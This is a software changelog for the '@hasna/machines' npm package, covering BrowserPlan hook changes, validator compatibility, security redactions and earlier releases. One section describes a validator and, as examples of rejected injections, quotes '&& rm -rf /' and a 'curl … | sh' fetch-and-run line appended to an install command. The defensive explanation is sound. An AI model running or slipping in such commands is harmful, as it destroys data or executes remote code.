# Changelog

All notable changes to `@hasna/machines` are documented here. The format is
based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this
project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Fixed

- **BrowserPlan `app_install_update` no longer depends on a git checkout.** The
  hook's `command_template` was
  `cd <open-chrome-project-root> && git pull --ff-only origin main && bun install
  --frozen-lockfile`, which cannot survive the owner-authorised retirement of the
  BrowserPlan source repository. It is now
  `bun install -g @hasna/open-chrome@latest`, installing from the npm package that
  ships the `browserplan` bin. `command_placeholders` becomes `[]` and
  `required_capabilities` drops `git` (installing from npm needs only `bun`), so
  machines without git are no longer reported as blocked for this hook.

  The template tracks the `latest` dist-tag rather than exposing a version
  placeholder because **nothing in this package could resolve one**:
  `getPackageVersion()` returns *machines*' own version, and unlike `machines
  reconcile` — which pins versions from the fleet manifest — the hook contract has
  no version source of truth. A placeholder with no resolver would only move the
  problem to the caller.

  On the old template: it was already unlikely to succeed, but **not for the
  reason an earlier draft of this entry gave.** `<open-chrome-project-root>` does
  resolve — `machines browserplan fleet --json` returns a non-null
  `workspace.project_root` for all 11 target machines — but every one reports
  `project_root_source: "inferred"`, a derived path rather than a manifest
  mapping, and spot checks found no such directory on the machines examined.

### Compatibility

- **Consumers pinned to `@hasna/machines` <= 0.2.2 will reject the new
  `app_install_update` payload.** The 0.2.2 validator *requires* the literal
  `<open-chrome-project-root>` token, which the new template does not contain, so
  an old validator reports `ok: false` with one `command_template` error per
  machine. `MACHINES_CONSUMER_CONTRACT_VERSION` is deliberately **left at `1`**:
  raising it would make consumers treat *every* envelope as unsupported —
  `iapp-knowledge`'s adapter (`src/machines.ts`, adapter contract version 1)
  reports `unsupported_contract_version` and returns `null` for topology, route
  and workspace payloads whose `schema_version` exceeds 1 — a far larger break
  than the one hook it does not read. A per-envelope version would not help
  either: `schema_version` is a single global constant stamped on all 28
  envelopes, and no consumer gates on a per-envelope one.

  No consumer validates the `browserplan_fleet` envelope: `open-loops` uses only
  `discoverMachineTopology` and `resolveMachineRoute`, `open-dispatch` loads the
  consumer purely for route resolution, and `iapp-knowledge` declares
  `validateMachinesConsumerEnvelope` as a one-parameter optional capability it
  never invokes. `hasna/identities` documents reading this envelope
  (`docs/browserplan.md`) but does not consume it.

### Release story

- This change **cannot ship from `package.json` at `0.2.2`** — that version is
  already published and `scripts/verify-release.ts` correctly refuses. A version
  bump is required before publishing, and the skew above is only closed once
  consumers move past it; merging alone does not close it.
- **Validation expands for every template any released version actually emits, and
  narrows only for hand-edited variants.** `validateMachinesConsumerEnvelope`
  accepts an `app_install_update` template that is either `bun install -g
  @hasna/open-chrome@` followed by a bare npm version or dist-tag — so a caller may
  pin `…@0.1.0` rather than track `latest` — **or** exactly equals the legacy
  checkout template, so a payload cached from any version up to 0.2.2 keeps
  validating.

  Precisely, and not overstated: the legacy arm is exact equality, so *modified*
  legacy strings that 0.2.2 accepted are now refused — trailing or leading
  whitespace, a dropped `--frozen-lockfile`, an added flag, or `origin main`
  shortened to `origin`. No emitter produces those, and every template emitted by a
  released version validates, but the rule is stricter than 0.2.2 for hand-edited
  input rather than a pure superset of it.

  The version suffix is **end-anchored**. That matters more than the prefix: a
  prefix-only check accepts anything appended after a valid install — `…@latest &&
  rm -rf /`, `…@latest; curl http://host/x.sh | sh`, `…@latest; cd d && git pull` —
  and an empty version. Those are rejected, as are git-based rewrites
  (`git fetch && git reset --hard`, `git -C <dir> pull`, `git clone`). This is an
  allowlist of command *shape*, not a `git pull` phrase denylist, which would have
  been trivially evadable. It is not a trust check: a legitimate but
  hostile-looking dist-tag such as `latest-evil` is within the npm tag charset and
  is accepted.
- Every other BrowserPlan surface is unchanged — owner ids, target name, machine
  ids, operation ids, stable surfaces — and
  `schemas/machines-consumer.schema.json` is byte-for-byte identical, because the
  emitted template is not constrained by the JSON Schema. **That artifact being
  unchanged is not evidence that consumers are unaffected**; see the validator
  skew above.

### Changed

- The BrowserPlan owner ids are now single named exports instead of literals
  repeated across the contract, the schema bundle, and the validators:
  `BROWSERPLAN_APP_ID`, `BROWSERPLAN_PACKAGE_NAME`, `BROWSERPLAN_CLI_COMMAND`,
  `BROWSERPLAN_ROUTE_OWNER`, `BROWSERPLAN_SECRETS_OWNER`, and
  `BROWSERPLAN_INSTALL_UPDATE_COMMAND_PREFIX` /
  `BROWSERPLAN_INSTALL_UPDATE_COMMAND_TEMPLATE` (`src/browserplan.ts`). A test
  pins `BROWSERPLAN_APP_ID === defaultAppIdForPackage(BROWSERPLAN_PACKAGE_NAME)`
  and `BROWSERPLAN_ROUTE_OWNER === defaultAppIdForPackage(MACHINES_PACKAGE_NAME)`
  so the ids stay derived from the package names that define them. Emitted
  values are unchanged.
- Added `bun run schema:generate`
  (`scripts/generate-consumer-schema.ts`) to regenerate
  `schemas/machines-consumer.schema.json` from
  `MACHINES_CONSUMER_SCHEMA_BUNDLE`; the artifact is no longer hand-edited, and
  `test/consumer.test.ts` now asserts byte identity rather than only deep
  equality.

## [0.2.2] - 2026-07-24

### Fixed

- Fixed a `tsc` type-check/declaration-emit failure (TS2352) in
  `reportTopLevelError` (`src/cli/index.ts`): the Commander `exitCode` is now
  read via a single narrowing read instead of an invalid `Error -> { exitCode:
  number }` cast, so `bun run build` / `verify:release` succeed. The emitted
  runtime JS is unchanged.
- Replaced the unresolvable `@hasna/mcp-harness` dependency pin
  (`file:../open-mcp`) with the published registry range (`^0.1.0`). This clears
  the `TS2307: Cannot find module '@hasna/mcp-harness'` error in
  `src/mcp/http.ts` (and its MCP smoke test) on clean checkouts and CI, where no
  `../open-mcp` sibling exists. API surface used (`healthPayload`, `isHttpMode`,
  `resolveMcpHttpPort`) is present in `@hasna/mcp-harness@0.1.0`.

## [0.2.1] - 2026-07-24

### Security

- Removed the shipped internal-infra hostname default (`*.hasna.xyz`) from the
  fleet-flip / cloud-transport code, the `distribute-cloud-keys` script, docs,
  and the JSON Schema `$id`. The per-app self-hosted API URL default is now
  built from `HASNA_FLEET_API_DOMAIN` (REQUIRED for a real deployment) and
  otherwise falls back to a neutral, non-resolving placeholder domain
  (`your-deployment.example`) instead of a real internal hostname.
  `MACHINES_CONSUMER_SCHEMA_URI` now uses the neutral `schemas.example.com`
  placeholder (identifier string only; never fetched). Also redacted a real AWS
  account ID + RDS instance identifier from `docs/FLEET-FLIP.md`. Any real
  `machines flip` run must now set `HASNA_FLEET_API_DOMAIN` (or explicit per-app
  `HASNA_<APP>_API_URL`). (#17)

## [0.2.0] - 2026-07-24

### Added

- Added `machines reconcile`: desired-state package reconcile for
  machines-agent. Plans and executes `bun install -g pkg@version` against the
  manifest, verifies CLI `--version` (and declared `hasna-*-mcp` health
  endpoints), rolls back to the prior version on verification failure, and
  emits `hasna.rollout_record.v1` events (`release.rollout.started/completed/
  failed`, `app.installed`) through the `@hasna/events` envelope. Dry-run by
  default; `--apply` requires scoped mutation approval. Triggerable from a
  `release.published` event via `--event-json` or `reconcileFromReleaseEvent`.
- Added `machines freeze add|remove|list|check`: supply-chain freeze gate that
  blocks reconcile installs/updates of frozen packages (ported from the
  skill-package-update incident-freeze rule), with optional `--until` expiry
  and manifest-declared fleet-wide freeze entries.
- Extended the `machines.json` schema (backward compatible): fleet-wide
  `packages` desired-state list, `freeze` list, and per-package `appId`,
  `bin`, `verify`, and `mcpHealthUrl` fields aligned with the distribution
  contracts. `verify: false` marks library-only packages without a CLI so
  reconcile skips the `<bin> --version` check instead of flapping through
  verify-fail/rollback cycles.

### Fixed

- Closed a freeze-gate bypass for programmatic callers: `buildReconcilePlan`
  (and `reconcileFromReleaseEvent`) with an in-memory `manifest` now merge the
  on-disk `freeze.json` entries (`machines freeze add`) with the manifest's
  freeze list instead of skipping the disk gate entirely.
- Made the consumer conformance fixture hermetic: "SDK absent" cases now
  install an always-failing tombstone package so ambient `node_modules`
  directories above the temp app (for example `/tmp/node_modules`) cannot leak
  a real `@hasna/machines` into resolution.

## [0.1.6] - 2026-07-24

### Fixed

- `machines heartbeat collector-command` no longer bakes the deprecated
  `--fail-on-error` flag into the canonical/blessed OpenLoops collector
  command. `heartbeat collect` now always exits non-zero on any failed
  import, so failure detection in the trusted loop no longer depends on the
  flag; `--fail-on-error` is a deprecated no-op retained for backwards
  compatibility (help text and README updated to match). (#21)

## [0.1.5] - 2026-07-24

### Fixed

- `machines manifest` subcommands (`init`, `path`, `list`, `validate`,
  `bootstrap`, `get`, `remove`, `add`) now accept the standard `-j/--json`
  flag instead of hard-failing with `error: unknown option '--json'`, so
  uniform `--json` tooling no longer breaks on the manifest command group.
  (#19)
- `machines screen-credentials --all --json` no longer exits non-zero when a
  discovered machine is unroutable: a listing that returns data for at least
  one machine now succeeds, unroutable machines are surfaced per-entry, and a
  new `--strict` flag restores full fail-closed behaviour. (#18)
- CLI error and usage-validation paths now emit structured
  `{ ok: false, error, code }` under `-j/--json` (screen-credentials with
  neither `--machine` nor `--all`; `workspace resolve`/`workspace doctor`
  missing `--machine`; `backup` with no resolvable S3 bucket; `db migrate`
  in cloud mode with no database URL) instead of writing plain text or
  Commander's default usage errors that broke JSON consumers. (#20)
- `machines ops db-integrity` now bounds total quick_check work with an
  effective time budget (default 20s, `--max-total-ms`), reporting remaining
  databases as `skipped_budget` instead of hanging past the deadline on
  stations with hundreds of SQLite files. (#22)

### Note

- Version reconciliation: this release restores the committed version line to
  match the published npm `latest`. Versions `0.1.0`–`0.1.4` were published to
  npm from the `main` line on 2026-07-08 but the accompanying `package.json`
  bumps, CHANGELOG entries, and git tags were never committed back. The
  `[0.1.0]`–`[0.1.4]` entries below are backfilled from the merged feature
  commits; `0.1.5` is the first release cut with fully committed provenance.

## [0.1.4] - 2026-07-08

### Added

- Cloud machine registry CRUD routes to the hosted control plane
  (`/v1/machines`) when running in `self_hosted` mode, so registry reads and
  writes go through the shared control plane rather than local-only state.
  (#15)

## [0.1.3] - 2026-07-08

### Fixed

- Fleet env-flip API client operates correctly in `self_hosted` mode across
  all 25 apps, with atomic `--all-machines` application. (#14)

## [0.1.2] - 2026-07-08

_Published from the `main` line on 2026-07-08 as part of the self-host / fleet
control-plane rollout. No standalone changelog entry was recorded at publish
time; the feature set is captured under `[0.1.0]`–`[0.1.4]`._

## [0.1.1] - 2026-07-08

_Published from the `main` line on 2026-07-08 as part of the self-host / fleet
control-plane rollout. No standalone changelog entry was recorded at publish
time; the feature set is captured under `[0.1.0]`–`[0.1.4]`._

## [0.1.0] - 2026-07-08

### Added

- Self-host machines control plane: `machines serve /v1`, the machines SDK,
  cloud runtime storage, and deploy support, enabling a `self_hosted`
  deployment of the machine fleet control plane. (#13)
- Fleet env-flip mechanism to move machines between `local` and `cloud`
  runtime modes with canary rollout. (#9)

### Changed

- Documented the interim per-machine RDS tunnel rollout step and the verifier
  contract note for the fleet flip. (#11)

## [0.0.63] - 2026-07-04

### Added

- Added `machines heartbeat collector-command` to emit the package-owned
  OpenLoops heartbeat collector command instead of relying on ad hoc scheduled
  shell snippets.
- Added `machines heartbeat collect --fail-on-error` so scheduled collector
  runs fail when any selected heartbeat import fails.

### Changed

- Documented that one-minute OpenLoops heartbeat collectors must use explicit
  low-latency targets and must not schedule `machines topology --all --json`,
  which only reads stale topology rows.

### Added

- Root open-source release policy files: `SECURITY.md`, `CONTRIBUTING.md`, and
  `CODE_OF_CONDUCT.md`.

### Changed

- Release verification now uses Bun package-manager commands instead of
  requiring `npm` on PATH.

## [0.0.58] - 2026-06-27

### Added

- Added loop-ready `machines ops db-integrity` and
  `machines ops state-snapshot` commands for bounded SQLite integrity checks,
  verified ops-state snapshots, private JSON evidence, and deduped todos task
  upserts.
- Added regression coverage for WAL-mode snapshot safety, sqlite3 missing
  fail-closed behavior, bounded truncation output, private report/snapshot
  permissions, retention safety, and task-upsert idempotency.

### Fixed

- Collapsed missing sqlite3 into one dependency-level task suggestion, capped
  default machine-data task creation, and fixed snapshot paths containing
  apostrophes.

## [0.0.55] - 2026-06-27

### Added

- `machines ops check` can now opt into safe deduped todos task creation with
  `--upsert-tasks --todos-project <path>` while preserving the default
  read-only diagnostics behavior.
- Added SDK exports for argv-safe Fleet Ops task upserts so deterministic loops
  can route machine/topology/tmux findings through tasks instead of tmux panes.

## Earlier Releases

Versions `0.0.1` through `0.0.54` were published before this root changelog was
introduced. Use the git history and npm registry metadata for release timing,
package provenance, and release-specific change details for those versions.
